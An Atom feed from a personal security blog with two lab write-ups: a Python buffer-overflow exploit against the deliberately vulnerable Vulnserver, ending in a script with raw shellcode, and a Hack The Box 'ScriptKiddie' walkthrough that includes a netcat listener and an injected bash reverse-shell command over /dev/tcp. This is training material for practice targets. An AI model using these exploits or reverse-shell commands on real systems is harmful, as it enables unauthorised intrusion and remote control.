<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>PwN2Re</title>
  
  <subtitle>Share and learn about information security</subtitle>
  <link href="http://haojame.github.io/atom.xml" rel="self"/>
  
  <link href="http://haojame.github.io/"/>
  <updated>2021-05-16T04:34:05.504Z</updated>
  <id>http://haojame.github.io/</id>
  
  <author>
    <name>James</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Exploit Windows Kernel With Vulnserver</title>
    <link href="http://haojame.github.io/2021/05/15/windowskernel/"/>
    <id>http://haojame.github.io/2021/05/15/windowskernel/</id>
    <published>2021-05-15T06:22:54.000Z</published>
    <updated>2021-05-16T04:34:05.504Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This is probably my first hands-on with the Windows Kernel. In this part I will try to gain more experience for further jumps.</p><h2 id="What-we-will-cover"><a href="#What-we-will-cover" class="headerlink" title="What we will cover"></a>What we will cover</h2><ol><li>Anatomy of the stack</li><li>Fuzzing</li><li>Finding the offset</li><li>Overwriting the EIP</li><li>Finding bad characters</li><li>Finding the right module</li><li>Generating shellcode</li><li>Gaining root!</li></ol><h2 id="Tools-needed-for-this-walkthrough"><a href="#Tools-needed-for-this-walkthrough" class="headerlink" title="Tools needed for this walkthrough"></a>Tools needed for this walkthrough</h2><p>-A Windows machine (preferably Windows 10)</p><p>-Your favorite hacking VM (I’ll be using Kali Linux) -&gt; with me i will use Windows 10 and if give shell i will use Kali :))</p><p>–Vulnserverinstalled on your Windows machine</p><p>–Immunity Debugger installed on your Windows machine</p><p>–Mona Modules installed in your Immunity Debugger folder</p><h2 id="Anatomy-of-the-stack"><a href="#Anatomy-of-the-stack" class="headerlink" title="Anatomy of the stack"></a>Anatomy of the stack</h2><p>ESP -&gt; Buffer Space -&gt; EBP -&gt; EIP/Return Address</p><p><img src="./images/WindowKernel/Stack.png"></p><h2 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h2><p>The first step in any buffer overflow is fuzzing. Fuzzing allows us to send bytes of data to a vulnerable program. My script build with python3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">from time import sleep</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import socket</span><br><span class="line">host &#x3D; &quot;192.168.0.102&quot;</span><br><span class="line">port &#x3D; 9999</span><br><span class="line">payload &#x3D; b&quot;A&quot;*3000</span><br><span class="line">s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((host, port))</span><br><span class="line">print(s.recv(1024))</span><br><span class="line">print(&quot;[*] Sending exploit…&quot;)</span><br><span class="line">s.send(b&quot;TRUN &#x2F;.:&#x2F;&quot; + payload)</span><br><span class="line">print(s.recv(1024))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><h2 id="Finding-the-Offset"><a href="#Finding-the-Offset" class="headerlink" title="Finding the Offset"></a>Finding the Offset</h2><p>First, if you use Windows 10, then download: <a href="https://github.com/Svenito/exploit-pattern">https://github.com/Svenito/exploit-pattern</a> or Kali, we use these tools are located in the /usr/share/metasploit-framework/tools/exploit</p><h3 id="Kali-Linux"><a href="#Kali-Linux" class="headerlink" title="Kali Linux"></a>Kali Linux</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pattern_create.rb -l 3000</span><br></pre></td></tr></table></figure><h3 id="Windows-10"><a href="#Windows-10" class="headerlink" title="Windows 10"></a>Windows 10</h3><p><img src="./images/WindowKernel/pattern_create.png"></p><p>New code should look something like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">from time import sleep</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import socket</span><br><span class="line">host &#x3D; &quot;192.168.0.102&quot;</span><br><span class="line">port &#x3D; 9999</span><br><span class="line">payload &#x3D; b&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9&quot;</span><br><span class="line">s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((host, port))</span><br><span class="line">print(s.recv(1024))</span><br><span class="line">print(&quot;[*] Sending exploit…&quot;)</span><br><span class="line">s.send(b&quot;TRUN &#x2F;.:&#x2F;&quot; + payload)</span><br><span class="line">print(s.recv(1024))</span><br><span class="line">s.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>After, we give offset of EIP address when we send script:</p><p><img src="./images/WindowKernel/pattern_create_debug.png"></p><p>Can you see offset EIP address ? Yep, We have overwrite EIP, now we find hex code in pattern create when we use it give script.</p><p><img src="./images/WindowKernel/find_offset_EIP.png"></p><p>You can see, an exact match was found at 2003 bytes. This is great news. We can now try to control the EIP, which will be critical later in our exploit.</p><h2 id="Overwriting-the-EIP-address-Return-Address"><a href="#Overwriting-the-EIP-address-Return-Address" class="headerlink" title="Overwriting the EIP address/Return Address"></a>Overwriting the EIP address/Return Address</h2><p>We edit script into</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">from time import sleep</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import socket</span><br><span class="line">host &#x3D; &quot;192.168.0.102&quot;</span><br><span class="line">port &#x3D; 9999</span><br><span class="line">payload &#x3D; b&quot;A&quot;*2003</span><br><span class="line">payload +&#x3D; b&quot;B&quot;*4 #EIP address</span><br><span class="line">s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((host, port))</span><br><span class="line">print(s.recv(1024))</span><br><span class="line">print(&quot;[*] Sending exploit…&quot;)</span><br><span class="line">s.send(b&quot;TRUN &#x2F;.:&#x2F;&quot; + payload)</span><br><span class="line">print(s.recv(1024))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p><img src="./images/WindowKernel/overwrite_success.png"></p><p>We have overwite EIP success. We will be in full control and well on our way to root :D</p><h2 id="Finding-Bad-Characters"><a href="#Finding-Bad-Characters" class="headerlink" title="Finding Bad Characters"></a>Finding Bad Characters</h2><p>We need find bad characters because it can break our shellcode, making them unable to work we want.</p><p>We need install mona.py in Immunity Debugger</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona modules</span><br></pre></td></tr></table></figure><p><img src="./images/WindowKernel/mona_modules.png"></p><p>To make the most reliable exploit, we want to use a module without ASLR or Rebase.</p><p>What we need to do now is find the opcode equivalent of JMP ESP. We are using JMP ESP because our EIP will point to the JMP ESP location, which will jump to our malicious shellcode that we will inject later.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona find -s “\xff\xe4” -m essfunc.dll</span><br></pre></td></tr></table></figure><p>We use it find JUMP ESP instruction in essfunc.dll</p><p><img src="./images/WindowKernel/find_JUMP_ESP.png"></p><p>Next you need to determine what “\x90” is and how the shell is then put in the payload to advance or spawn the shell. This is my last script</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">from time import sleep</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import socket</span><br><span class="line">host &#x3D; &quot;192.168.0.102&quot;</span><br><span class="line">port &#x3D; 9999</span><br><span class="line"></span><br><span class="line">shell &#x3D; b&quot;\xd9\xc3\xd9\x74\x24\xf4\x5b\x31\xc9\xba\xcb\x47\xd6\xbd\xb1&quot;                                                                                                                                                                             </span><br><span class="line">shell +&#x3D; b&quot;\x52\x31\x53\x17\x03\x53\x17\x83\x20\xbb\x34\x48\x4a\xac\x3b&quot;                                                                                                                                                                             </span><br><span class="line">shell +&#x3D; b&quot;\xb3\xb2\x2d\x5c\x3d\x57\x1c\x5c\x59\x1c\x0f\x6c\x29\x70\xbc&quot;                                                                                                                                                                             </span><br><span class="line">shell +&#x3D; b&quot;\x07\x7f\x60\x37\x65\xa8\x87\xf0\xc0\x8e\xa6\x01\x78\xf2\xa9&quot;                                                                                                                                                                             </span><br><span class="line">shell +&#x3D; b&quot;\x81\x83\x27\x09\xbb\x4b\x3a\x48\xfc\xb6\xb7\x18\x55\xbc\x6a&quot;                                                                                                                                                                             </span><br><span class="line">shell +&#x3D; b&quot;\x8c\xd2\x88\xb6\x27\xa8\x1d\xbf\xd4\x79\x1f\xee\x4b\xf1\x46&quot;                                                                                                                                                                             </span><br><span class="line">shell +&#x3D; b&quot;\x30\x6a\xd6\xf2\x79\x74\x3b\x3e\x33\x0f\x8f\xb4\xc2\xd9\xc1&quot;                                                                                                                                                                             </span><br><span class="line">shell +&#x3D; b&quot;\x35\x68\x24\xee\xc7\x70\x61\xc9\x37\x07\x9b\x29\xc5\x10\x58&quot;                                                                                                                                                                             </span><br><span class="line">shell +&#x3D; b&quot;\x53\x11\x94\x7a\xf3\xd2\x0e\xa6\x05\x36\xc8\x2d\x09\xf3\x9e&quot;                                                                                                                                                                             </span><br><span class="line">shell +&#x3D; b&quot;\x69\x0e\x02\x72\x02\x2a\x8f\x75\xc4\xba\xcb\x51\xc0\xe7\x88&quot;                                                                                                                                                                             </span><br><span class="line">shell +&#x3D; b&quot;\xf8\x51\x42\x7e\x04\x81\x2d\xdf\xa0\xca\xc0\x34\xd9\x91\x8c&quot;                                                                                                                                                                             </span><br><span class="line">shell +&#x3D; b&quot;\xf9\xd0\x29\x4d\x96\x63\x5a\x7f\x39\xd8\xf4\x33\xb2\xc6\x03&quot;                                                                                                                                                                             </span><br><span class="line">shell +&#x3D; b&quot;\x33\xe9\xbf\x9b\xca\x12\xc0\xb2\x08\x46\x90\xac\xb9\xe7\x7b&quot;                                                                                                                                                                             </span><br><span class="line">shell +&#x3D; b&quot;\x2c\x45\x32\x2b\x7c\xe9\xed\x8c\x2c\x49\x5e\x65\x26\x46\x81&quot;                                                                                                                                                                             </span><br><span class="line">shell +&#x3D; b&quot;\x95\x49\x8c\xaa\x3c\xb0\x47\x15\x68\xba\xf0\xfd\x6b\xba\xff&quot;                                                                                                                                                                             </span><br><span class="line">shell +&#x3D; b&quot;\x46\xe2\x5c\x95\xa8\xa3\xf7\x02\x50\xee\x83\xb3\x9d\x24\xee&quot;                                                                                                                                                                             </span><br><span class="line">shell +&#x3D; b&quot;\xf4\x16\xcb\x0f\xba\xde\xa6\x03\x2b\x2f\xfd\x79\xfa\x30\x2b&quot;                                                                                                                                                                        </span><br><span class="line">shell +&#x3D; b&quot;\x15\x60\xa2\xb0\xe5\xef\xdf\x6e\xb2\xb8\x2e\x67\x56\x55\x08&quot;                                                                                                                                                                             </span><br><span class="line">shell +&#x3D; b&quot;\xd1\x44\xa4\xcc\x1a\xcc\x73\x2d\xa4\xcd\xf6\x09\x82\xdd\xce&quot;                                                                                                                                                                             </span><br><span class="line">shell +&#x3D; b&quot;\x92\x8e\x89\x9e\xc4\x58\x67\x59\xbf\x2a\xd1\x33\x6c\xe5\xb5&quot;                                                                                                                                                                             </span><br><span class="line">shell +&#x3D; b&quot;\xc2\x5e\x36\xc3\xca\x8a\xc0\x2b\x7a\x63\x95\x54\xb3\xe3\x11&quot;                                                                                                                                                                             </span><br><span class="line">shell +&#x3D; b&quot;\x2d\xa9\x93\xde\xe4\x69\xa3\x94\xa4\xd8\x2c\x71\x3d\x59\x31&quot;</span><br><span class="line">shell +&#x3D; b&quot;\x82\xe8\x9e\x4c\x01\x18\x5f\xab\x19\x69\x5a\xf7\x9d\x82\x16&quot;</span><br><span class="line">shell +&#x3D; b&quot;\x68\x48\xa4\x85\x89\x59&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload &#x3D; b&quot;A&quot;*2003 + b&#39;\xAF\x11\x50\x62&#39; + b&quot;\x90&quot;*32 + shell</span><br><span class="line"></span><br><span class="line">s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((host, port))</span><br><span class="line">print(s.recv(1024))</span><br><span class="line">print(&quot;[*] Sending exploit…&quot;)</span><br><span class="line">s.send(b&quot;TRUN &#x2F;.:&#x2F;&quot; + payload)</span><br><span class="line">print(s.recv(1024))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>Here is our final result.<br><img src="./images/WindowKernel/result.png"><br>Happy hacking :D</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;This is probably my first hand</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Script Kiddie-HTB(Hack the box)</title>
    <link href="http://haojame.github.io/2021/05/03/HTB/"/>
    <id>http://haojame.github.io/2021/05/03/HTB/</id>
    <published>2021-05-03T05:45:35.000Z</published>
    <updated>2021-05-03T14:49:41.845Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This is my first post on the analysis of something in my research.<br>I think I should do this sooner to be able to share what I’m learning and vice versa, also want to receive your feedback on what I have encountered and how to improve it.<br>Currently I am starting to learn about HTB and have tried a fairly simple post like its name when looking at it and immediately recognize “ScriptKiddie” :).<br><img src="./images/HTB_basic/image_1.PNG"></p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>First we will use <em>nmap</em> to have the machine to see which port the machine is using and analyze each port in the machine.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 10.10.10.226</span><br></pre></td></tr></table></figure><p><img src="./images/HTB_basic/nmap.png"><br>Here we get 2 ports. One is port=22 and port=5000(upnp).</p><h6 id="What-is-upnp"><a href="#What-is-upnp" class="headerlink" title="What is upnp ?"></a>What is upnp ?</h6><p>Universal Plug and Play (UPnP) uses two ports, 5000 TCP and 1900 UDP.<br>UPnP is a set of networking protocols that allows for networked and mobile devices to seamlessly discover each others’ presence on the network and communicate.<br>Now we are going to the website.<br><img src="./images/HTB_basic/web.png"></p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>We will use metasploit to perform another pregnancy. For newbies, it is necessary to search by keyword “Template command injection msfvenom” for more details :).<br><img src="./images/HTB_basic/metasploit.png"><br>Here I will use the address tun0 to exploit the program.<br><img src="./images/HTB_basic/exploit.png"><br>Next we will give the highest permissions to file.apk and proceed to use the file in the website.<br>We will open port 4444 </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p>We need open before using file.apk in website :).<br><img src="./images/HTB_basic/payload.png"><br>and<br><img src="./images/HTB_basic/connect_success.png"><br>In this case, we would use to push the shell in to be able to get RCE with victim.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p><img src="./images/HTB_basic/shell.png"><br>Now we will find the User’s flag to go 50/50 the way :).<br>We just comeback <em>/home</em> and  check file  <em>kid</em>.<br><img src="./images/HTB_basic/user_flag.png"><br>Now we will check the other sections, when we get the user’s flag.<br><img src="./images/HTB_basic/pwn.png"><br>Open port 1337 or whatever port you like and insert the following script into the program to reverse shell.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;  ;&#x2F;bin&#x2F;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;your IP&#x2F;your port 0&gt;&amp;1&#39; #&quot; &gt;&gt; hackers</span><br></pre></td></tr></table></figure><p><img src="./images/HTB_basic/nc_port_1337.png"><br>Now checking commands, which can be useful to escalate privileges.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="./images/HTB_basic/sudo_l.png"><br>Now we have the highest privilege and just find flag(root)  and you’re done. :))).<br><em>sudo msfconsole</em>, we need it as a root  :).<br><img src="./images/HTB_basic/done.png"><br>Done.</p><p>This is a simple exercise, but it also learns a lot about pentesting for newbie.<br>I hope I can be of help to everyone. If there is any error, you can comment.<br>Thank you very much.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;This is my first post on the a</summary>
      
    
    
    
    
  </entry>
  
</feed>
